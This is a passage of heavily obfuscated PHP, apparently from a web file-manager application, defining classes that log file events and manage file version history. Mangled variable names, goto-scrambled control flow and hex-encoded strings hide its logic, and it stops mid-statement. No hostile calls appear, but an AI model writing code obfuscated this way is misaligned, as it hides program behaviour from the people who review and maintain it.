foreach ($f¤ÔğçËöÖ as $AîÇß¼ŒÆá) { if ($AîÇß¼ŒÆá[$f˜¦‘˜ ¥Ü[389]] == SourceModel::TYPE_USER) { $B¢„Üù„Œ‰[] = intval($AîÇß¼ŒÆá[$f˜¦‘˜ ¥Ü[474]]); } else { if ($AîÇß¼ŒÆá[$f˜¦‘˜ ¥Ü[389]] == SourceModel::TYPE_GROUP) { $C Â¿ìà‹š[] = intval($AîÇß¼ŒÆá[$f˜¦‘˜ ¥Ü[474]]); } } } if ($B¢„Üù„Œ‰) { $B¢„Üù„Œ‰ = Model($f˜¦‘˜ ¥Ü[492])->userListInfo($B¢„Üù„Œ‰); } if ($C Â¿ìà‹š) { $BœóÇõó™Ğ = array($f˜¦‘˜ ¥Ü[1743] => array($f˜¦‘˜ ¥Ü[402], $C Â¿ìà‹š)); $C Â¿ìà‹š = Model($f˜¦‘˜ ¥Ü[476])->field($f˜¦‘˜ ¥Ü[1756])->where($BœóÇõó™Ğ)->select(); $C Â¿ìà‹š = array_to_keyvalue($C Â¿ìà‹š, $f˜¦‘˜ ¥Ü[1661]); } goto EøÇµ‘ÄŒì; b÷¡ßÓ¤ï„: } public function authInfo($C¾Ò‚Å‹•è) { $dÚ†…ª“• =& $_SERVER[Æ¼ôºÙï]; if ($C¾Ò‚Å‹•è[$dÚ†…ª“•[1811]]) { $cæØÑçÎß = Model($dÚ†…ª“•[1830])->listData($C¾Ò‚Å‹•è[$dÚ†…ª“•[1811]]); if (!$cæØÑçÎß) { return !1; $A¾“ÕÕíì = Model($dÚ†…ª“•[1830])->listData(); $a”´ì‰Ì±á = array_filter_by_field($A¾“ÕÕíì, $dÚ†…ª“•[394], $dÚ†…ª“•[486]); return $a”´ì‰Ì±á; } $F§ò¦¬Ã± = array_field_key($cæØÑçÎß, array($dÚ†…ª“•[385], $dÚ†…ª“•[28], $dÚ†…ª“•[394], $dÚ†…ª“•[1682], $dÚ†…ª“•[1684])); $F§ò¦¬Ã±[$dÚ†…ª“•[1868]] = $C¾Ò‚Å‹•è; return $F§ò¦¬Ã±; } else { return array($dÚ†…ª“•[403] => 0, $dÚ†…ª“•[1667] => $C¾Ò‚Å‹•è[$dÚ†…ª“•[1812]], $dÚ†…ª“•[404] => $dÚ†…ª“•[33], $dÚ†…ª“•[1682] => $dÚ†…ª“•[1869]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\x63\145\137\145\166\145\x6e\164"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\x69\155\145", "\x74\x69\x6d\145", "\x69\156\163\145\162\164", "\146\165\x6e\x63\164\x69\157\156"), array("\x64\145\x73\143", '', "\x69\x6e\x73\x65\x72\x74\x2c\165\x70\x64\x61\x74\145\54\x73\x65\x6c\145\x63\164", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($DÕ§„¿‡õ‰, $dƒƒçÑÖ, $dõ‰³Û’‘” = '') { goto C¨‡¼’å; bôäÄÃ’Ü: $c¼œÂ©í²¿ = array($A¨µ‹­Óğƒ[401] => $DÕ§„¿‡õ‰, $A¨µ‹­Óğƒ[1870] => $cİƒàŞ‡ã[$A¨µ‹­Óğƒ[479]], $A¨µ‹­Óğƒ[1871] => $cİƒàŞ‡ã[$A¨µ‹­Óğƒ[28]], $A¨µ‹­Óğƒ[484] => $cİƒàŞ‡ã[$A¨µ‹­Óğƒ[484]], $A¨µ‹­Óğƒ[1494] => USER_ID, $A¨µ‹­Óğƒ[406] => $dƒƒçÑÖ, $A¨µ‹­Óğƒ[1496] => $dõ‰³Û’‘”); $this->addSystemLog($dƒƒçÑÖ, $c¼œÂ©í²¿); return $this->add($c¼œÂ©í²¿); goto c‘—ç›Ï„; b¼Œİëºñ: if (!$cİƒàŞ‡ã) { return !1; } if ($this->isCacheEvent($cİƒàŞ‡ã, $dƒƒçÑÖ)) { return; } if ($dõ‰³Û’‘” && is_string($dõ‰³Û’‘”)) { $dõ‰³Û’‘” = array($A¨µ‹­Óğƒ[1695] => $dõ‰³Û’‘”); } goto bôäÄÃ’Ü; C¨‡¼’å: $A¨µ‹­Óğƒ =& $_SERVER[Æ¼ôºÙï]; if (!$this->eventSave) { return; } $cİƒàŞ‡ã = Model($A¨µ‹­Óğƒ[1182])->sourceInfo($DÕ§„¿‡õ‰); goto b¼Œİëºñ; c‘—ç›Ï„: } private function addSystemLog($c²œˆ¾½Èâ, $aäÉË‡ğ¢¢) { $c›ëÉé¿øÛ =& $_SERVER[Æ¼ôºÙï]; if ($c²œˆ¾½Èâ == $c›ëÉé¿øÛ[1872]) { $c²œˆ¾½Èâ = $aäÉË‡ğ¢¢[$c›ëÉé¿øÛ[422]][$c›ëÉé¿øÛ[1873]]; } else { if (in_array($c²œˆ¾½Èâ, array($c›ëÉé¿øÛ[1638], $c›ëÉé¿øÛ[1874]))) { $c²œˆ¾½Èâ = $aäÉË‡ğ¢¢[$c›ëÉé¿øÛ[422]][$c›ëÉé¿øÛ[711]]; } } $f»ì¾«óÕŒ = array_merge($aäÉË‡ğ¢¢, array($c›ëÉé¿øÛ[1875] => $aäÉË‡ğ¢¢[$c›ëÉé¿øÛ[387]], $c›ëÉé¿øÛ[1876] => $aäÉË‡ğ¢¢[$c›ëÉé¿øÛ[1876]])); Model($c›ëÉé¿øÛ[1601])->addLog($c›ëÉé¿øÛ[1877] . $c²œˆ¾½Èâ, $f»ì¾«óÕŒ); } private function isCacheEvent($A®¸öĞ¡‡, $aù½ôŒ¹×˜) { if ($A®¸öĞ¡‡[$_SERVER[Æ¼ôºÙï][389]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($B¤„—ù•Ï, $fœŠå¡³·) { $AÀ§ö‰Çø =& $_SERVER[Æ¼ôºÙï]; $AÀˆ®õ­‚ƒ = Model($AÀ§ö‰Çø[1182])->sourceInfo($B¤„—ù•Ï); $AÃÚ®†Ÿ…¬ = array($AÀ§ö‰Çø[1873] => $fœŠå¡³·, $AÀ§ö‰Çø[28] => $AÀˆ®õ­‚ƒ[$AÀ§ö‰Çø[28]]); return $this->addEvent($B¤„—ù•Ï, $AÀ§ö‰Çø[1872], $AÃÚ®†Ÿ…¬); } public function eventFileEdit($EÂñªªˆ§) { $BÃğéôõç =& $_SERVER[Æ¼ôºÙï]; $E·“¿Ó¿ãë = array($BÃğéôõç[1878] => $_SERVER[$BÃğéôõç[1879]], $BÃğéôõç[1880] => strtolower(ACTION)); return $this->addEvent($EÂñªªˆ§, $BÃğéôõç[1628], $E·“¿Ó¿ãë); } public function eventRecycle($F°¨Â©ƒä, $FèãË‹É·ì) { return $this->addEvent($F°¨Â©ƒä, $_SERVER[Æ¼ôºÙï][1874], $FèãË‹É·ì); } public function eventRemove($E¸ÚÍ–å‚½) { $aª²¹²ÆÑ‹ =& $_SERVER[Æ¼ôºÙï]; $eì¶¨Œ¨´ = Model($aª²¹²ÆÑ‹[1182])->sourceInfo($E¸ÚÍ–å‚½); $c„¦Ÿëªì = $eì¶¨Œ¨´[$aª²¹²ÆÑ‹[28]]; return $this->addEvent($eì¶¨Œ¨´[$aª²¹²ÆÑ‹[479]], $aª²¹²ÆÑ‹[1627], $c„¦Ÿëªì); } public function eventShare($EìÙ‘ºˆ±, $câé¹Ú×ÑĞ) { return $this->addEvent($EìÙ‘ºˆ±, $_SERVER[Æ¼ôºÙï][1638], $câé¹Ú×ÑĞ); } public function eventMove($BíøÌËâ­·, $BÃÕà¼œ«, $EƒŒğÁòç) { goto f ËÖŒ¶„„; fç×•æ²˜‚: $this->addEvent($BíøÌËâ­·, $E†¨èÃİõÅ[509], $BŞ­íÚ£˜Í); $Dº´‹…÷‘ = $fÙì™Øñô‹->sourceInfo($BíøÌËâ­·); $BŞ­íÚ£˜Í = array($E†¨èÃİõÅ[387] => $Dº´‹…÷‘[$E†¨èÃİõÅ[387]], $E†¨èÃİõÅ[28] => $Dº´‹…÷‘[$E†¨èÃİõÅ[28]]); goto D‚‚·ìêÛ¦; fìÚÄÇ…É‹: $d¬öõâãœ = $fÙì™Øñô‹->sourceInfo($BÃÕà¼œ«); $FĞŸ š¡ª = $fÙì™Øñô‹->sourceInfo($EƒŒğÁòç); $BŞ­íÚ£˜Í = array($E†¨èÃİõÅ[1034] => $BÃÕà¼œ«, $E†¨èÃİõÅ[1881] => $d¬öõâãœ[$E†¨èÃİõÅ[28]], $E†¨èÃİõÅ[1862] => $d¬öõâãœ[$E†¨èÃİõÅ[484]], $E†¨èÃİõÅ[1035] => $EƒŒğÁòç, $E†¨èÃİõÅ[1882] => $FĞŸ š¡ª[$E†¨èÃİõÅ[28]], $E†¨èÃİõÅ[1883] => $FĞŸ š¡ª[$E†¨èÃİõÅ[484]]); goto fç×•æ²˜‚; f ËÖŒ¶„„: $E†¨èÃİõÅ =& $_SERVER[Æ¼ôºÙï]; $fÙì™Øñô‹ = Model($E†¨èÃİõÅ[1182]); $Dº´‹…÷‘ = $fÙì™Øñô‹->sourceInfo($BíøÌËâ­·); goto fìÚÄÇ…É‹; D‚‚·ìêÛ¦: $this->addEvent($BÃÕà¼œ«, $E†¨èÃİõÅ[1884], $BŞ­íÚ£˜Í); goto A´®ºÜãÁš; A´®ºÜãÁš: } public function eventCopy($D™ğ·Öõ‡) { $this->eventCreate($D™ğ·Öõ‡, $_SERVER[Æ¼ôºÙï][507]); } public function eventRename($aäìÖï–¢Ø, $D™ÇÑÓóâ, $eÓ‹ÕŠğ«) { $cÆğ…¬·Ë =& $_SERVER[Æ¼ôºÙï]; $bíùŠ–Şç = array($cÆğ…¬·Ë[1034] => $D™ÇÑÓóâ, $cÆğ…¬·Ë[1035] => $eÓ‹ÕŠğ«); return $this->addEvent($aäìÖï–¢Ø, $cÆğ…¬·Ë[1195], $bíùŠ–Şç); } public function eventAddComment($E‹ò¯Îç°, $Dâ“ø›Î‰) { return $this->addEvent($E‹ò¯Îç°, $_SERVER[Æ¼ôºÙï][1885], $Dâ“ø›Î‰); } public function eventAddDesc($fÓò¶ª„›», $DéøŠ¶½ö•) { return $this->addEvent($fÓò¶ª„›», $_SERVER[Æ¼ôºÙï][1886], $DéøŠ¶½ö•); } public function listBySource($F»„Ö¸âŒâ) { goto b„“¬ĞŒ; b„“¬ĞŒ: $díÉ¹‡•½ë =& $_SERVER[Æ¼ôºÙï]; $C›îïÏ‹•Ì = Model($díÉ¹‡•½ë[1182])->sourceInfo($F»„Ö¸âŒâ); $cÁ´Û§ÙÑ = array($díÉ¹‡•½ë[401] => $F»„Ö¸âŒâ); goto E†ö¬¯ã…º; E†ö¬¯ã…º: if ($C›îïÏ‹•Ì[$díÉ¹‡•½ë[388]] == $díÉ¹‡•½ë[86]) { $c¸ğ‹±®Êœ = Model($díÉ¹‡•½ë[1182])->listSearchChildren($F»„Ö¸âŒâ, 20000); $c¸ğ‹±®Êœ[] = $F»„Ö¸âŒâ . $díÉ¹‡•½ë[370]; $cÁ´Û§ÙÑ = array($díÉ¹‡•½ë[387] => array($díÉ¹‡•½ë[7], $c¸ğ‹±®Êœ)); } $A×ïŒÅê´ = $this->where($cÁ´Û§ÙÑ)->order($díÉ¹‡•½ë[1887])->selectPage(); if ($A×ïŒÅê´[$díÉ¹‡•½ë[360]][$díÉ¹‡•½ë[361]] == 0) { $A×ïŒÅê´[$díÉ¹‡•½ë[360]][$díÉ¹‡•½ë[361]] = 1; $A×ïŒÅê´[$díÉ¹‡•½ë[363]] = array(array($díÉ¹‡•½ë[401] => $F»„Ö¸âŒâ, $díÉ¹‡•½ë[1870] => $C›îïÏ‹•Ì[$díÉ¹‡•½ë[479]], $díÉ¹‡•½ë[1494] => $C›îïÏ‹•Ì[$díÉ¹‡•½ë[396]], $díÉ¹‡•½ë[406] => $díÉ¹‡•½ë[1888], $díÉ¹‡•½ë[407] => $C›îïÏ‹•Ì[$díÉ¹‡•½ë[192]], $díÉ¹‡•½ë[1496] => $díÉ¹‡•½ë[33])); } goto c×“šâÛ¥; c×“šâÛ¥: return $this->eventListParse($A×ïŒÅê´, $F»„Ö¸âŒâ); goto fíò«ç–À‰; fíò«ç–À‰: } private function eventListParse($A‡™‘†Ú»İ, $FßÔ¯òÊ•š) { goto bĞ×˜ßëŸ®; f‘Í–¬ˆ¸: $A‡™‘†Ú»İ[$f•ŒËäÉâÓ[363]] = $eÎ©×Ø˜Ÿ; return $A‡™‘†Ú»İ; goto AñˆÒ×ÓğØ; D‚µ—’”¸: $e†ñŞ£ ¸ = Model($f•ŒËäÉâÓ[770])->sourceListInfo($F„®›àÌ‚, !0); foreach ($eÎ©×Ø˜Ÿ as &$Fîëìİ¦¬) { if ($Fîëìİ¦¬[$f•ŒËäÉâÓ[29]] == $f•ŒËäÉâÓ[509] && isset($Fîëìİ¦¬[$f•ŒËäÉâÓ[422]][$f•ŒËäÉâÓ[1034]])) { $Fîëìİ¦¬[$f•ŒËäÉâÓ[422]][$f•ŒËäÉâÓ[1034]] = $e†ñŞ£ ¸[$Fîëìİ¦¬[$f•ŒËäÉâÓ[422]][$f•ŒËäÉâÓ[1034]]]; $Fîëìİ¦¬[$f•ŒËäÉâÓ[422]][$f•ŒËäÉâÓ[1035]] = $e†ñŞ£ ¸[$Fîëìİ¦¬[$f•ŒËäÉâÓ[422]][$f•ŒËäÉâÓ[1035]]]; } if ($Fîëìİ¦¬[$f•ŒËäÉâÓ[29]] == $f•ŒËäÉâÓ[1884] && isset($Fîëìİ¦¬[$f•ŒËäÉâÓ[422]][$f•ŒËäÉâÓ[387]])) { $Fîëìİ¦¬[$f•ŒËäÉâÓ[422]][$f•ŒËäÉâÓ[387]] = $e†ñŞ£ ¸[$Fîëìİ¦¬[$f•ŒËäÉâÓ[422]][$f•ŒËäÉâÓ[387]]]; } $Fîëìİ¦¬[$f•ŒËäÉâÓ[84]] = $e†ñŞ£ ¸[$Fîëìİ¦¬[$f•ŒËäÉâÓ[387]]]; $Fîëìİ¦¬[$f•ŒËäÉâÓ[1889]] = $e†ñŞ£ ¸[$Fîëìİ¦¬[$f•ŒËäÉâÓ[1876]]]; if ($Fîëìİ¦¬[$f•ŒËäÉâÓ[29]] == $f•ŒËäÉâÓ[1627]) { $Fîëìİ¦¬[$f•ŒËäÉâÓ[1889]] = $Fîëìİ¦¬[$f•ŒËäÉâÓ[84]]; $Fîëìİ¦¬[$f•ŒËäÉâÓ[1876]] = $Fîëìİ¦¬[$f•ŒËäÉâÓ[1889]][$f•ŒËäÉâÓ[387]]; $Fîëìİ¦¬[$f•ŒËäÉâÓ[84]] = !1; $Fîëìİ¦¬[$f•ŒËäÉâÓ[387]] = $f•ŒËäÉâÓ[33]; } $Fîëìİ¦¬[$f•ŒËäÉâÓ[1820]] = $F»Œ“Õø©[$Fîëìİ¦¬[$f•ŒËäÉâÓ[1502]]]; } unset($Fîëìİ¦¬); goto f‘Í–¬ˆ¸; Câá»ƒ§¡à: $F„®›àÌ‚ = array_unique($F„®›àÌ‚); $EŒÖí½ö† = array_unique(array_to_keyvalue($eÎ©×Ø˜Ÿ, $f•ŒËäÉâÓ[33], $f•ŒËäÉâÓ[1502])); $F»Œ“Õø© = Model($f•ŒËäÉâÓ[495])->userListInfo($EŒÖí½ö†); goto D‚µ—’”¸; DßøÒ½‹Œ: $Aµ‘¸ÚÀÁÈ = array_to_keyvalue($eÎ©×Ø˜Ÿ, $f•ŒËäÉâÓ[33], $f•ŒËäÉâÓ[1876]); foreach ($eÎ©×Ø˜Ÿ as $Fîëìİ¦¬) { $F¦·µööÏ = $Fîëìİ¦¬[$f•ŒËäÉâÓ[422]]; if ($Fîëìİ¦¬[$f•ŒËäÉâÓ[29]] == $f•ŒËäÉâÓ[509] && isset($F¦·µööÏ[$f•ŒËäÉâÓ[1034]])) { $F„®›àÌ‚[] = $F¦·µööÏ[$f•ŒËäÉâÓ[1034]] . $f•ŒËäÉâÓ[33]; $F„®›àÌ‚[] = $F¦·µööÏ[$f•ŒËäÉâÓ[1035]] . $f•ŒËäÉâÓ[33]; } if ($Fîëìİ¦¬[$f•ŒËäÉâÓ[29]] == $f•ŒËäÉâÓ[1884] && isset($F¦·µööÏ[$f•ŒËäÉâÓ[387]])) { $F„®›àÌ‚[] = $F¦·µööÏ[$f•ŒËäÉâÓ[387]] . $f•ŒËäÉâÓ[33]; } } $F„®›àÌ‚ = array_merge($F„®›àÌ‚, $Aµ‘¸ÚÀÁÈ, array($FßÔ¯òÊ•š . $f•ŒËäÉâÓ[33])); goto Câá»ƒ§¡à; bĞ×˜ßëŸ®: $f•ŒËäÉâÓ =& $_SERVER[Æ¼ôºÙï]; $eÎ©×Ø˜Ÿ = $A‡™‘†Ú»İ[$f•ŒËäÉâÓ[363]]; $F„®›àÌ‚ = array_to_keyvalue($eÎ©×Ø˜Ÿ, $f•ŒËäÉâÓ[33], $f•ŒËäÉâÓ[387]); goto DßøÒ½‹Œ; AñˆÒ×ÓğØ: } public function removeBySource($B·á³‹ŒÁ) { $b‰èŸÉë†ô = array($_SERVER[Æ¼ôºÙï][401] => $B·á³‹ŒÁ); $this->where($b‰èŸÉë†ô)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\x72\x63\145\x5f\x68\151\x73\x74\x6f\162\x79"; public function historyCount($E ì²ÔÛ­) { goto C‘ÌËÍƒÃï; C‘ÌËÍƒÃï: $d¦¡ø‘òäñ =& $_SERVER[Æ¼ôºÙï]; if (!$E ì²ÔÛ­) { return array(); } if (is_string($E ì²ÔÛ­) || is_int($E ì²ÔÛ­)) { $E ì²ÔÛ­ = array($E ì²ÔÛ­); } goto cæƒÃ±Çï; cæƒÃ±Çï: $E¦ƒ­®Ì¤ = $d¦¡ø‘òäñ[1890]; $eæ¶˜ÍˆàØ = array($d¦¡ø‘òäñ[387] => array($d¦¡ø‘òäñ[7], $E ì²ÔÛ­)); $c™‰ò–Ç‰ö = $this->field($E¦ƒ­®Ì¤)->where($eæ¶˜ÍˆàØ)->group($d¦¡ø‘òäñ[387])->select(); goto F¬öàÉîí; F¬öàÉîí: return array_to_keyvalue($c™‰ò–Ç‰ö, $d¦¡ø‘òäñ[387], $d¦¡ø‘òäñ[1694]); goto E°˜½—ÌÃÍ; E°˜½—ÌÃÍ: } public function addHistory($E‡Ò¬¾¼Ìã, $aì‡ÄøÉ = '') { $E‘½ÜËˆò =& $_SERVER[Æ¼ôºÙï]; $d‹©Æ–«¯¬ = array($E‘½ÜËˆò[401] => $E‡Ò¬¾¼Ìã[$E‘½ÜËˆò[387]], $E‘½ÜËˆò[1494] => isset($E‡Ò¬¾¼Ìã[$E‘½ÜËˆò[397]]) ? $E‡Ò¬¾¼Ìã[$E‘½ÜËˆò[397]] : $E‡Ò¬¾¼Ìã[$E‘½ÜËˆò[396]], $E‘½ÜËˆò[437] => $E‡Ò¬¾¼Ìã[$E‘½ÜËˆò[436]], $E‘½ÜËˆò[537] => $E‡Ò¬¾¼Ìã[$E‘½ÜËˆò[77]], $E‘½ÜËˆò[1891] => $aì‡ÄøÉ); $F®ÆØÒÕùõ = $GLOBALS[$E‘½ÜËˆò[6]][$E‘½ÜËˆò[87]][$E‘½ÜËˆò[1082]]; if ($F®ÆØÒÕùõ > 1) { $this->historyAutoClear($d‹©Æ–«¯¬[$E‘½ÜËˆò[387]]); $this->add($d‹©Æ–«¯¬); } Hook::trigger($E‘½ÜËˆò[1892], $d‹©Æ–«¯¬); Model($E‘½ÜËˆò[1893])->eventFileEdit($E‡Ò¬¾¼Ìã[$E‘½ÜËˆò[387]]); } private function historyAutoClear($b‘¥ø›¬‡º) { goto CÓ°…Œ¹öÜ; d”Œ’¤ƒ™Ÿ: $Dàë†‹†Š = $bÈÔ°Ä—³ == $Fùõ¸Ù¯[1105] ? 5 : $a°ê¢÷¤; if ($a°ê¢÷¤ <= 1) { $Dàë†‹†Š = 1; } if ($Dàë†‹†Š >= 500) { return; } goto c±©¾È¨³Œ; E²õÓÌ••: $this->where($F·ƒÔËï)->delete(); Model($Fùõ¸Ù¯[439])->remove($eãíºãèğ); goto Dœ†½›ˆ‘†; c±©¾È¨³Œ: $F·ƒÔËï = array($Fùõ¸Ù¯[401] => $b‘¥ø›¬‡º); $B³«²¾ƒç = $this->field($Fùõ¸Ù¯[1894])->where($F·ƒÔËï)->order($Fùõ¸Ù¯[1887])->select(); if (!$B³«²¾ƒç || $Dàë†‹†Š >= count($B³«²¾ƒç)) { return; } goto BéÃ”„…Ô«; b¦ˆöîœĞø: $eãíºãèğ = array_slice($eãíºãèğ, $Dàë†‹†Š); if (!$Bî§—’…ŠÇ || !$eãíºãèğ) { return; } $F·ƒÔËï = array($Fùõ¸Ù¯[403] => array($Fùõ¸Ù¯[7], $Bî§—’…ŠÇ)); goto E²õÓÌ••; CÓ°…Œ¹öÜ: $Fùõ¸Ù¯ =& $_SERVER[Æ¼ôºÙï]; $bÈÔ°Ä—³ = Model($Fùõ¸Ù¯[1103])->get($Fùõ¸Ù¯[1104]); $a°ê¢÷¤ = $GLOBALS[$Fùõ¸Ù¯[6]][$Fùõ¸Ù¯[87]][$Fùõ¸Ù¯[1082]]; goto d”Œ’¤ƒ™Ÿ; BéÃ”„…Ô«: $Bî§—’…ŠÇ = array_to_keyvalue($B³«²¾ƒç, $Fùõ¸Ù¯[33], $Fùõ¸Ù¯[385]); $Bî§—’…ŠÇ = array_slice($Bî§—’…ŠÇ, $Dàë†‹†Š); $eãíºãèğ = array_to_keyvalue($B³«²¾ƒç, $Fùõ¸Ù¯[33], $Fùõ¸Ù¯[436]); goto b¦ˆöîœĞø; Dœ†½›ˆ‘†: } public function listData($CöÇöÑ¶èõ) { goto F•”õ‚ÕİÀ; F•”õ‚ÕİÀ: $Cİİ£–÷‡³ =& $_SERVER[Æ¼ôºÙï]; $Aãï‰•¾µŒ = array($Cİİ£–÷‡³[401] => $CöÇöÑ¶èõ); $f„–…‹³Î‹ = $Cİİ£–÷‡³[1895]; goto cñÀéÍ…Æ®; C˜¶ÕğŠ’Û: $díÕ²“„Æ = 5; if ($dì£™ä×ÀÓ == $Cİİ£–÷‡³[1105]) { $aíÆå¯îç[$Cİİ£–÷‡³[363]] = array_slice($aíÆå¯îç[$Cİİ£–÷‡³[363]], 0, $díÕ²“„Æ); $aíÆå¯îç[$Cİİ£–÷‡³[360]] = array($Cİİ£–÷‡³[1896] => 1, $Cİİ£–÷‡³[1897] => 20, $Cİİ£–÷‡³[1898] => 1, $Cİİ£–÷‡³[1899] => count($aíÆå¯îç[$Cİİ£–÷‡³[363]])); } return $aíÆå¯îç; goto EßõâË—œ¾; cñÀéÍ…Æ®: $aíÆå¯îç = $this->field($f„–…‹³Î‹)->where($Aãï‰•¾µŒ)->order($Cİİ£–÷‡³[1887])->selectPage(); $this->_listAppendUser($aíÆå¯îç[$Cİİ£–÷‡³[363]]); $dì£™ä×ÀÓ = Model($Cİİ£–÷‡³[1103])->get($Cİİ£–÷‡³[1104]); goto C˜¶ÕğŠ’Û; EßõâË—œ¾: } protected function _listAppendUser(&$EÔ§äó†“) { $e•ŒŠğ£² =& $_SERVER[Æ¼ôºÙï]; $Eê¢â…ñ÷ø = array_to_keyvalue($EÔ§äó†“, $e•ŒŠğ£²[33], $e•ŒŠğ£²[1502]); $EÙÉõœõ­¤ = Model($e•ŒŠğ£²[495])->userListInfo($Eê¢â…ñ÷ø); foreach ($EÔ§äó†“ as &$FË¦ƒîù) { $aöïñ¦èí• = $FË¦ƒîù[$e•ŒŠğ£²[1502]]; $FË¦ƒîù[$e•ŒŠğ£²[396]] = $EÙÉõœõ­¤[$aöïñ¦èí•] ? $EÙÉõœõ­¤[$aöïñ¦èí•] : !1; } unset($FË¦ƒîù); } public function fileInfo($CÜß˜Ÿ×) { $b÷ÎƒäßÎÔ =& $_SERVER[Æ¼ôºÙï]; $e˜éä¿Üô = $this->tablePrefix; $Eƒ™ºõˆõó = "{$e˜éä¿Üô}\x69\157\137\x66\x69\x6c\x65\40\x66\x69\154\x65\163\40\x6f\x6e\40\146\151\x6c\x65\163\56\146\151\154\x65\x49\104\40\75\x20\x68\x69\x73\164\x6f\x72\x79\56\146\x69\154\145\x49\x44"; return $this->alias($b÷ÎƒäßÎÔ[1900])->where(array($b÷ÎƒäßÎÔ[403] => $CÜß˜Ÿ×))->join($Eƒ™ºõˆõó, $b÷ÎƒäßÎÔ[1901])->find(); } public function removeItem($f“ÎÜÑëÔ§) { $b†‘ˆµçù =& $_SERVER[Æ¼ôºÙï]; $D¦ò¡¿ÆĞ = array($b†‘ˆµçù[403] => $f“ÎÜÑëÔ§); $e½ªÅ…©”Ô = $this->where($D¦ò¡¿ÆĞ)->find(); if ($e½ªÅ…©”Ô) { $eÜ—”ƒšöÂ = $this->where($D¦ò¡¿ÆĞ)->delete(); Model($b†‘ˆµçù[439])->remove($e½ªÅ…©”Ô[$b†‘ˆµçù[436]]); return $eÜ—”ƒšöÂ; } return !1; } public function removeBySource($AÕšŞ¯„”Â) { goto Cšçæ×·›ˆ; cŒéÕŒî„‘: return !0; goto fëª°‚êèè; Cšçæ×·›ˆ: $B‘Íªä¢æ‰ =& $_SERVER[Æ¼ôºÙï]; if (!$AÕšŞ¯„”Â) { return !1; } if (!is_array($AÕšŞ¯„”Â)) { $AÕšŞ¯„”Â = array($AÕšŞ¯„”Â); } goto Aä¸…™¯Şù; Aä¸…™¯Şù: $b¦š–ÍšŠÍ = array($B‘Íªä¢æ‰[401] => array($B‘Íªä¢æ‰[7], $AÕšŞ¯„”Â)); $DšÖ”Ííø³ = $this->field($B‘Íªä¢æ‰[437])->where($b¦š–ÍšŠÍ)->select(); if ($DšÖ”Ííø³) { $this->where($b¦š–ÍšŠÍ)->delete(); $eî“»Ü¨Ô´ = array_to_keyvalue($DšÖ”Ííø³, $B‘Íªä¢æ‰[33], $B‘Íªä¢æ‰[436]); Model($B‘Íªä¢æ‰[439])->remove($eî“»Ü¨Ô´); } goto cŒéÕŒî„‘; fëª°‚êèè: } public function setDetail($aÚ¯¨Ô¢ËÜ, $BËÃ‘¾Ÿô) { $cª–—ÃÌ =& $_SERVER[Æ¼ôºÙï]; return $this->where(array($cª–—ÃÌ[403] => $aÚ¯¨Ô¢ËÜ))->save(array($cª–—ÃÌ[1891] => $BËÃ‘¾Ÿô)); } public function rollbackToItem($fæ£¥˜åĞ…, $CÉ„Ğë¢™È) { goto dîñŞÓÅ»; CÜ“Ë§¬Ü: return $this->where(array($féÚ®¤Êø[403] => $CÉ„Ğë¢™È))->delete(); goto bÏ²ô¾ŒŞ; f´«Âœå‡: $DõÔ†˜ğƒ’ = $this->find($CÉ„Ğë¢™È); $Bˆ¼²«Ğ†¾ = array($féÚ®¤Êø[436] => $DõÔ†˜ğƒ’[$féÚ®¤Êø[436]], $féÚ®¤Êø[77] => $DõÔ†˜ğƒ’[$féÚ®¤Êø[77]], $féÚ®¤Êø[83] => time(), $féÚ®¤Êø[397] => USER_ID); Model($féÚ®¤Êø[770])->where(array($féÚ®¤Êø[387] => $fæ£¥˜åĞ…))->save($Bˆ¼²«Ğ†¾); goto CÜ“Ë§¬Ü; dîñŞÓÅ»: $féÚ®¤Êø =& $_SERVER[Æ¼ôºÙï]; $eŸ‰‹‡²–Å = Model($féÚ®¤Êø[770])->sourceInfo($fæ£¥˜åĞ…); $this->addHistory($eŸ‰‹‡²–Å, LNG($féÚ®¤Êø[1902])); goto f´«Âœå‡; bÏ²ô¾ŒŞ: } public function clearSame($FùÃÉö×í) { goto cÂÜĞ¶š; AÄ¶êôĞËË: if (!$DŸ•„Ô»´‚) { return; } $this->where(array($DŠ«»“•Ü‚[385] => array($DŠ«»“•Ü‚[7], $DŸ•„Ô»´‚)))->delete(); Model($DŠ«»“•Ü‚[439])->remove($b¶´¸‰†½Ê); goto BÁººÃ“†–; béƒÇ×î¾™: $b¶´¸‰†½Ê = array(); $DŸ•„Ô»´‚ = array(); foreach ($B‘·¢é·ôë as $e×˜¼ÊİŒ) { if (!$e×˜¼ÊİŒ || count($e×˜¼ÊİŒ) <= 1) { continue; } foreach ($e×˜¼ÊİŒ as $Dˆİø‰Õ¬ğ) { $b¶´¸‰†½Ê[] = $Dˆİø‰Õ¬ğ[$DŠ«»“•Ü‚[436]]; $DŸ•„Ô»´‚[] = $Dˆİø‰Õ¬ğ[$DŠ«»“•Ü‚[385]]; } } goto AÄ¶êôĞËË; cÂÜĞ¶š: $DŠ«»“•Ü‚ =& $_SERVER[Æ¼ôºÙï]; $FÂç´¸‡¾õ = $this->listData($FùÃÉö×í); $B‘·¢é·ôë = array_to_keyvalue_group($FÂç´¸‡¾õ, $DŠ«»“•Ü‚[436]); goto béƒÇ×î¾™; BÁººÃ“†–: } public function userSpace() { $a¼àÅìŒ =& $_SERVER[Æ¼ôºÙï]; $e±º¸ë = $this->tablePrefix; $EØ›Ÿù´À = array($a¼àÅìŒ[1494] => USER_ID); $EëÓ×ÜöÂ = "{$e±º¸ë}\x69\x6f\137\146\151\154\145\40\146\x69\x6c\145\x73\x20\x6f\156\x20\146\x69\x6c\145\x73\x2e\146\x69\x6c\x65\x49\104\40\x3d\x20\150\x69\x73\164\x6f\162\171\56\146\151\154\x65\x49\104"; return $this->alias($a¼àÅìŒ[1900])->where($EØ›Ÿù´À)->join($EëÓ×ÜöÂ, $a¼àÅìŒ[1901])->sum($a¼àÅìŒ[77]); } } goto AÖ­‚ ğô²; aÉ„·½¤—µ: if ($_SERVER[$_SERVER[Æ¼ôºÙï][813]] != $_SERVER[$_SERVER[Æ¼ôºÙï][1734]]) { goto fàãÒØÆù•; fñŸ‰Ò: $b§°Ñ§Ş‚… = explode($_SERVER[Æ¼ôºÙï][227], 